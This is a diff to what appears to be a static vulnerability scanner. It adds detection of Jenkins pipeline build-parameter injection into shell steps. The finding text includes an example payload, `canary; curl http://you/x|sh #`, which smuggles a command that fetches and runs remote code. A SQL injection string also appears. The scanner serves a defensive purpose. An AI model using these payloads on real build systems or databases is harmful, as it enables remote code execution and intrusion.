@@ -24,6 +24,7 @@ from .deps import find_vulnerable_deps
 from .xxe_guard import filter_guarded_xxe
 from .vendor_guard import is_vendor_file, NOISY_IN_VENDOR_FILES
 from .ast_engine import scan_ast, AST_SUPPORTED_LANGUAGES
+from .jenkins_pipeline_guard import find_jenkins_param_injection, GROOVY_LANGUAGES
 
 # No hand-written vulnerable application code is ever a single line this long —
 # only minified/bundled vendor files (tailwindcss.js, jquery.min.js, etc.) are,
@@ -406,6 +407,35 @@ def scan_lines(path: str, language: str, lines: List[str], patterns: list) -> Li
                     "physical lines, assigned to any variable name, and passed to a custom wrapper method "
                     "patterns.py's sink list wouldn't recognize by name.",
                 payload="' OR '1'='1' -- -",
+                confidence="likely",
+            ))
+
+    # best-effort Jenkins declarative-pipeline parameter injection: a
+    # `string(name: 'X', ...)` build parameter (directly, or via a direct
+    # `env.Y = params.X` alias) referenced inside a `sh` step's own body —
+    # Jenkins substitutes that text as literal shell input before
+    # invoking /bin/sh, so any build-triggering user controls part of the
+    # command run on the agent. See jenkins_pipeline_guard.py's module
+    # docstring for exactly what this does and doesn't try to prove.
+    if language in GROOVY_LANGUAGES:
+        for jf in find_jenkins_param_injection(path, language, lines):
+            key = (jf.line_no, "Command Injection")
+            if key in seen:
+                continue
+            seen.add(key)
+            findings.append(Finding(
+                file=jf.file,
+                line_no=jf.line_no,
+                line_text=jf.line_text,
+                vuln_name="Command Injection",
+                severity="high",
+                why="This sh step's body references a Jenkins build parameter (directly, or via an env.X = "
+                    "params.Y alias declared earlier in the file) declared in this pipeline's own parameters "
+                    "block. Jenkins substitutes that value as literal shell text before invoking /bin/sh — "
+                    "anyone able to trigger a parameterized build controls part of the command the agent runs.",
+                payload="Set the build parameter to something like `canary; curl http://you/x|sh #` (or your "
+                        "payload's own closing/continuation syntax for this exact shell step) next time a "
+                        "build is triggered.",
                 confidence="likely",
             ))
 
